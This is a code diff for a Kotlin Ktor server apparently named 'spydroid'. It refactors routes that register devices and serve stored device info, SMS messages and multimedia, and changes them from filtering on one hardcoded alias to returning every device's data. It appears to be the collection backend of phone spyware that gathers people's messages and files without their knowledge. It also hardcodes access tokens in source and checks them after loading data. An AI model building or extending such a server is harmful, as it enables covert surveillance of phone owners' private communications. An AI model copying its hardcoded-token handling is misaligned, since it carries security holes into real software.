@@ -24,7 +24,6 @@ import io.ktor.server.response.*
 import io.ktor.server.routing.*
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
-import kotlinx.coroutines.runBlocking
 import net.spydroid.server.domain.DevicesRepository
 import net.spydroid.server.domain.InfoRepository
 import net.spydroid.server.domain.MultimediaRepository
@@ -41,77 +40,99 @@ private object Routes {
 }
 
 fun Application.configureRouting() {
-
-    val devicesRepository: DevicesRepository by inject()
-    val infoRepository: InfoRepository by inject()
-    val multimediaRepository: MultimediaRepository by inject()
-    val smsRepository: SmsRepository by inject()
-
-    val ALIAS = "JUAN_KARLOS"
     val validTokens = setOf("iygad7618wg8y1f7fgvas71f671", "otroTokenValido")
 
     routing {
-        get(Routes.DEVICES) {
-            val accessToken = call.request.queryParameters["access_token"]
-            val devices = devicesRepository.getALlDevices()
-            if (accessToken in validTokens) {
-                call.respond(devices)
-            }
-        }
+        devices(validTokens)
+        info(validTokens)
+        sms(validTokens)
+        multimedia(validTokens)
+    }
+}
 
-        post(Routes.DEVICES) {
-            val params = call.receiveParameters()
-            val accesToken = params["access_token"] ?: return@post call.respond(
-                HttpStatusCode.BadRequest,
-                "Missing access token"
-            )
-            val alias = params["alias"] ?: return@post call.respond(
-                HttpStatusCode.BadRequest,
-                "Missing alias"
-            )
-            val name = params["name"] ?: return@post call.respond(
-                HttpStatusCode.BadRequest,
-                "Missing name"
-            )
+private fun Route.devices(validTokens: Set<String>) {
+
+    val devicesRepository: DevicesRepository by inject()
+
+    get(Routes.DEVICES) {
+        val accessToken = call.request.queryParameters["access_token"]
+        val devices = devicesRepository.getALlDevices()
+        if (accessToken in validTokens) {
+            call.respond(devices)
+        } else {
+            call.respond(HttpStatusCode.Unauthorized, "Invalid access token")
+        }
+    }
+
+    post(Routes.DEVICES) {
+        val params = call.receiveParameters()
+        val accessToken = params["access_token"] ?: return@post call.respond(
+            HttpStatusCode.BadRequest,
+            "Missing access token"
+        )
+        val alias = params["alias"] ?: return@post call.respond(
+            HttpStatusCode.BadRequest,
+            "Missing alias"
+        )
+        val name = params["name"] ?: return@post call.respond(
+            HttpStatusCode.BadRequest,
+            "Missing name"
+        )
+        if (accessToken in validTokens) {
+            this.launch(Dispatchers.IO) {
+                devicesRepository.insert(
+                    DeviceHandler(
+                        alias = alias,
+                        name = name
+                    )
+                )
+            }
             call.respond(
                 HttpStatusCode.OK,
                 "Device with alias '$alias' and name '$name' was processed successfully!"
             )
-            if (accesToken in validTokens) {
-                this.launch(Dispatchers.IO) {
-                    devicesRepository.insert(
-                        DeviceHandler(
-                            alias = alias,
-                            name = name
-                        )
-                    )
-                }
-            }
-        }
-
-        get(Routes.INFO) {
-            val accessToken = call.request.queryParameters["access_token"]
-            val info = infoRepository.filerWithAlias(ALIAS)
-            if (accessToken in validTokens) {
-                call.respond(info)
-            }
-        }
-
-        get(Routes.SMS) {
-            val accessToken = call.request.queryParameters["access_token"]
-            val sms = smsRepository.filerWithAlias(ALIAS)
-            if (accessToken in validTokens) {
-                call.respond(sms)
-            }
-        }
-
-        get(Routes.MULTIMEDIA) {
-            val accessToken = call.request.queryParameters["access_token"]
-            val multimedia = multimediaRepository.filerWithAlias(ALIAS)
-            if (accessToken in validTokens) {
-                call.respond(multimedia)
-            }
+        } else {
+            call.respond(HttpStatusCode.Unauthorized, "Invalid access token")
         }
     }
 }
 
+
+private fun Route.info(validTokens: Set<String>){
+
+    val infoRepository: InfoRepository by inject()
+
+    get(Routes.INFO) {
+        val accessToken = call.request.queryParameters["access_token"]
+        val info = infoRepository.getAllInfo()
+        if (accessToken in validTokens) {
+            call.respond(info)
+        }
+    }
+}
+
+private fun Route.sms(validTokens: Set<String>){
+
+    val smsRepository: SmsRepository by inject()
+
+    get(Routes.SMS) {
+        val accessToken = call.request.queryParameters["access_token"]
+        val sms = smsRepository.getALlSms()
+        if (accessToken in validTokens) {
+            call.respond(sms)
+        }
+    }
+}
+
+private fun Route.multimedia(validTokens: Set<String>){
+
+    val multimediaRepository: MultimediaRepository by inject()
+
+    get(Routes.MULTIMEDIA) {
+        val accessToken = call.request.queryParameters["access_token"]
+        val multimedia = multimediaRepository.getAllMultimedia()
+        if (accessToken in validTokens) {
+            call.respond(multimedia)
+        }
+    }
+}
